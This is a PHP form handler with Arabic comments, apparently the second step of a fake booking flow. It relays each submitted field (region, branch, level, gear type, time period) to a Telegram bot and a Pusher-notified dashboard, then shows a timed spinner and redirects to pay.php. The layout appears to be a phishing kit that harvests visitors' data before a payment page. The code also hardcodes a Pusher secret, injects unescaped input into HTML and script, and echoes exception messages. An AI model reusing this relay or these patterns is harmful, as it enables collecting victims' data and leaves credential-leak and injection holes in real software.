<?php
// tele/register-second.php
session_start();
header('Content-Type: text/html; charset=utf-8');

// تضمين ملف init.php
require_once '../dashboard/init.php';

// =====================================
// التحقق من الطلب
// =====================================
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo "❌ لا توجد بيانات للمعالجة";
    exit;
}

// =====================================
// التحقق من وجود جلسة المستخدم
// =====================================
if (!isset($_SESSION['current_user_id'])) {
    echo "❌ خطأ: لم يتم العثور على بيانات الجلسة. يرجى العودة للصفحة الأولى.";
    exit;
}

$userId = $_SESSION['current_user_id'];

// =====================================
// تحديث بيانات المستخدم (المرحلة الثانية)
// =====================================
try {
    $updateData = [
        'region' => $_POST['region'] ?? null,
        'branch' => $_POST['branch'] ?? null,
        'level' => $_POST['level'] ?? null,
        'gear_type' => $_POST['gear_type'] ?? null,
        'time_period' => $_POST['time_period'] ?? null
    ];
    
    // تحديث البيانات في قاعدة البيانات
    $result = $User->updateSecondStepData($userId, $updateData);
    
    if (!$result) {
        echo "❌ فشل تحديث البيانات";
        exit;
    }
    
} catch (Exception $e) {
    error_log("Error updating second step: " . $e->getMessage());
    echo "❌ خطأ: " . $e->getMessage();
    exit;
}

// =====================================
// تجهيز البيانات الكاملة
// =====================================
$allData = $_POST;
$allData['user_id'] = $userId;
$allData['step'] = 2;
$allData['submitted_at'] = date('Y-m-d H:i:s');

// =====================================
// إرسال إشعار عبر Pusher
// =====================================
try {
    require_once $_SERVER['DOCUMENT_ROOT'] . '/vendor/autoload.php';
    
    $options = [
        'cluster' => 'ap2',
        'useTLS' => true
    ];
    
    $pusher = new Pusher\Pusher(
        'a56388ee6222f6c5fb86',
        '4c77061f4115303aac58',
        '1973588',
        $options
    );

    $pusher->trigger('my-channel', 'my-event-newwwe', [
        'userId' => $userId,
        'message' => 'تحديث بيانات - المرحلة الثانية'
    ]);
    
} catch (Exception $e) {
    error_log("Pusher Error: " . $e->getMessage());
}

// =====================================
// تجهيز رسالة Telegram
// =====================================
$msg  = "📝 <b>تحديث بيانات - المرحلة الثانية</b>\n\n";
$msg .= "━━━━━━━━━━━━━━━━━━━\n\n";
$msg .= "🆔 <b>User ID:</b> #" . $userId . "\n\n";

$msg .= "📍 <b>المنطقة:</b> " . ($_POST['region'] ?? '-') . "\n";
$msg .= "🏢 <b>الفرع:</b> " . ($_POST['branch'] ?? '-') . "\n";
$msg .= "📊 <b>المستوى:</b> " . ($_POST['level'] ?? '-') . "\n";
$msg .= "⚙️ <b>نوع الجير:</b> " . ($_POST['gear_type'] ?? '-') . "\n";
$msg .= "🕐 <b>الفترة الزمنية:</b> " . ($_POST['time_period'] ?? '-') . "\n\n";

$msg .= "━━━━━━━━━━━━━━━━━━━\n";
$msg .= "⏰ <b>التاريخ:</b> " . date('Y-m-d H:i:s');

// ✅ تم تغيير التوجيه إلى pay.php
$redirect = "../pay.php";

// =====================================
// إرسال Telegram
// =====================================
file_get_contents(
    "https://api.telegram.org/bot{$botToken}/sendMessage",
    false,
    stream_context_create([
        'http' => [
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query([
                'chat_id'    => $chatId,
                'text'       => $msg,
                'parse_mode' => 'HTML'
            ])
        ]
    ])
);

// =====================================
// حفظ البيانات في localStorage والتحويل
// =====================================
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>جاري معالجة بياناتك...</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #ffffff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      direction: rtl;
    }
    
    .loading-container {
      text-align: center;
      background: white;
      padding: 60px 40px;
      border-radius: 20px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
      max-width: 400px;
      width: 90%;
    }
    
    .spinner {
      width: 80px;
      height: 80px;
      margin: 0 auto 30px;
      border: 8px solid #f3f3f3;
      border-top: 8px solid #667eea;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    .loading-text {
      font-size: 1.5rem;
      color: #333;
      font-weight: 600;
      margin-bottom: 15px;
    }
    
    .loading-subtext {
      font-size: 1rem;
      color: #666;
      margin-bottom: 20px;
    }
    
    .dots {
      display: inline-block;
      width: 50px;
      text-align: left;
    }
    
    .dots::after {
      content: '';
      animation: dots 1.5s steps(4) infinite;
    }
    
    @keyframes dots {
      0%, 20% { content: '.'; }
      40% { content: '..'; }
      60%, 100% { content: '...'; }
    }
    
    .checkmark {
      display: none;
      width: 80px;
      height: 80px;
      margin: 0 auto 20px;
      border-radius: 50%;
      background: #10b981;
      position: relative;
    }
    
    .checkmark::after {
      content: '✓';
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      font-size: 50px;
      color: white;
      font-weight: bold;
    }
    
    .success-message {
      display: none;
      color: #10b981;
      font-size: 1.3rem;
      font-weight: 600;
    }
  </style>
</head>
<body>
  <div class="loading-container">
    <div class="spinner" id="spinner"></div>
    <div class="checkmark" id="checkmark"></div>
    
    <div class="loading-text" id="loadingText">
      جاري معالجة بياناتك<span class="dots"></span>
    </div>
    
    <div class="loading-subtext" id="loadingSubtext">
      سيتم توجيهك لصفحة الدفع
    </div>
    
    <div class="success-message" id="successMessage">
     تم التحديث بنجاح!
    </div>
  </div>

  <script>
    // تحديث البيانات في localStorage
    const secondStepData = <?= json_encode($allData, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) ?>;
    const userId = '<?= $userId ?>';
    
    // دمج بيانات المرحلة الثانية مع البيانات السابقة
    let existingData = JSON.parse(localStorage.getItem('booking_data') || '{}');
    let combinedData = {...existingData, ...secondStepData};
    
    localStorage.setItem('booking_data', JSON.stringify(combinedData));
    localStorage.setItem('current_user_id', userId);
    
    // انتظار ثانيتين ثم إظهار علامة صح والتحويل
    setTimeout(function() {
      // إخفاء السبينر
      document.getElementById('spinner').style.display = 'none';
      
      // إظهار علامة الصح
      document.getElementById('checkmark').style.display = 'block';
      
      // تغيير النص
      document.getElementById('loadingText').style.display = 'none';
      document.getElementById('loadingSubtext').style.display = 'none';
      document.getElementById('successMessage').style.display = 'block';
      
      // ✅ التحويل إلى صفحة الدفع pay.php
      setTimeout(function() {
        window.location.href = "<?= $redirect ?>";
      }, 500);
      
    }, 2000);
  </script>
</body>
</html>